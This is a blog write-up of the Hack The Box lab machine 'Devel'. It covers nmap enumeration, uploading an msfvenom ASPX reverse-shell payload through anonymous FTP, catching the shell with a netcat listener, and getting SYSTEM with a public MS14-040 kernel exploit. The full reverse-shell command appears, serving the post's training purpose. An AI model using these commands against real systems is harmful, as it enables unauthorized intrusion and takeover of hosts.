---
layout: post
title: Hack The Box - Devel
---

This post is an overview of my time working through the box "Devel" found in [HackTheBox](https://www.hackthebox.eu)

---
![](/assets/image/attachmentsPasted&#32;image&#32;20210707143314.png)


### Nmap enumeration

```
# Nmap 7.91 scan initiated Mon Jun  7 11:30:40 2021 as: nmap -vvv -p 21,80 -sC -sV -oN 10.10.10.5 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up, received syn-ack (0.044s latency).
Scanned at 2021-06-07 11:30:40 EDT for 8s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  7 11:30:48 2021 -- 1 IP address (1 host up) scanned in 8.38 seconds

```

we see immediately that we have anonymous login to the ftp server:
```
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```
and based on the file preview we are given:

```
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
```

I think it is quite likely this is the base directory of the webserver on port 80. Navigating to http://10.10.10.5/welcome.png I confirm this:

![](/assets/image/attachmentsPasted&#32;image&#32;20210608132821.png)

## Reverse shell
with this knowledge we can generate an aspx reverse shell with msfvenom, upload it via the ftp server and then triger it via the web server.

I used the following payload 
```
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=53 EXITFUNC=thread -f aspx -o shell.aspx
```

setting up a netcat listener we get a shell

```
└─$ nc -lvnp 53     
Ncat: Version 7.91 ( https://nmap.org/ncat )   
Ncat: Listening on :::53                                               
Ncat: Listening on 0.0.0.0:53                                             
Ncat: Connection from 10.10.10.5.                                          
Ncat: Connection from 10.10.10.5:49157.

Microsoft Windows [Version 6.1.7600]                                               
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
```

## Privilege escalation
I discovered that the machine had a .NET framework too old (v3.5) to support running the winPEAS binaries, so I had to resort to the bat file


```
> reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s
.
.
.

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v3.5\1033  
    Version    REG_SZ    3.5.30729.4926 
    CBS    REG_DWORD    0x1    
    Install    REG_DWORD    0x1   
    SP    REG_DWORD    0x1 

```

we see in the winPEAS output there are no hotfixes installed (in hindsight I should have noticed this from sysinfo)
```
Hotfix(s):                 N/A  
```

we are given many possible kernel exploits to ru nbecause of this

```
"Microsoft Windows 7 Enterprise   "                         
   [i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)  
   
MS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys)        
MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)     
MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)                                      
MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)  
MS10-021 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)
MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)  
MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)  
MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)  
MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)   
MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)    
MS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)                
MS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)                     
MS05-055 patch is NOT installed 2K/SP4-APC Data-Free)                  
MS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)             
MS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)  
MS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)
MS04-020 patch is NOT installed 2K/SP4-POSIX)   
MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)                                            
MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)  
MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys) 
MS14-070 patch is NOT installed 2K3/SP2-TCP/IP)                       
MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)   
MS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)  
MS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu) 
```

with some google fu, I found a binary to exploit one of these [here](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-040). Uploading it via ftp and running it we get system. Now it is simply the case of reading the flags

```
c:\Users\babis\Desktop>type user.txt.txt                                       
type user.txt.txt                                         
<flag_here>
```

```
c:\Users\Administrator\Desktop>type root.txt         
type root.txt                                                                    
<flag_here> 
```

### Conclusion
Fun box, I ignored the obvious path to privesc for a while because well I thought it was too obvious, I won't make the same mistake again
